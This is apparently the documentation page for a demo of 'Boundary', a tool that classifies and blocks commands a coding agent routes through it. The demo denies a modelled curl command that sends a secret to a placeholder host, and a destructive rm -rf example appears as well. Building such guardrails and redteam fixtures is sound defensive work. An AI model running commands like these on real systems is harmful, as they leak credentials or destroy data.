# Lane 2: Command Boundary Demo

`boundary demo command-secret-exfil` is Lane 2 of Boundary's two-lane proof
spine. It exercises Command Boundary, a delivered preview routed-only surface,
by denying a routed secret-exfiltration command before execution.

Command Boundary governs project-local command paths only when those commands
route through Boundary.

For the equal-weight MCP production-route proof lane, run
`boundary demo github-lethal-trifecta` and read
[../DEMO_GITHUB_LETHAL_TRIFECTA.md](../DEMO_GITHUB_LETHAL_TRIFECTA.md). The
two-lane overview is [../DEMOS.md](../DEMOS.md).

## User-Facing Proof Lane

```bash
boundary demo command-secret-exfil
```

Expected success signal:

```text
actual: DENY
executed=false
class=C6
```

The fixture models a routed `curl -d [redacted] https://example.invalid`
secret-exfiltration command. Boundary classifies and evaluates the command,
denies it before execution, and emits a decision record. No real `.env` file is
read, no network call is made, and no live mutation occurs.

## Try It

Classify without executing:

```bash
boundary command classify -- git push origin main
```

Run an allowed wrapper-routed command:

```bash
boundary command run -- git status
```

Deny a destructive wrapper-routed command before execution:

```bash
boundary command run -- rm -rf fixture-dir
```

Launch a scoped project shell:

```bash
boundary shell
```

Or install project-local shims explicitly:

```bash
boundary command install --project
export PATH="$PWD/.boundary/bin:$PATH"
git status
```

The shell and shim paths use `.boundary/bin` inside the current project. They do
not edit global shell startup files or global `PATH`.

## What It Proves

- Wrapper-routed commands can be classified before execution.
- Denied or approval-required commands do not execute.
- Allowed commands execute through `os/exec` without shell interpolation.
- Command decision records can be emitted for wrapper-routed commands.
- Project-local shims can route selected commands through Boundary.
- Command redteam fixtures can demonstrate deny or require-approval outcomes
  without live mutation.

## What It Does Not Prove

- Global shell control.
- CI control unless the CI job explicitly routes commands through Boundary.
- SSH control.
- Coverage for every command path.
- Protection for direct shell access.
- Universal coding-agent safety.
- Shell sandboxing.

## Fixture Redteam Packs

Command Boundary includes fixture-only redteam packs:

```bash
boundary redteam --pack command-overeager-cleanup
boundary redteam --pack command-secret-exfil
boundary redteam --pack command-repo-mutation
```

These packs classify and evaluate risky command examples, emit command metadata,
and report `executed=false`. They do not run live destructive commands, make
network calls, or mutate repositories.

## Claim Boundary

Approved copy:

> Boundary provides preview project-local command governance for commands routed
> through `boundary command run`, `boundary shell`, or project-local shims.

Forbidden copy:

- Boundary controls all shell commands.
- Boundary protects direct shell access.
- Boundary prevents every overeager agent action.
- Boundary provides production command governance.
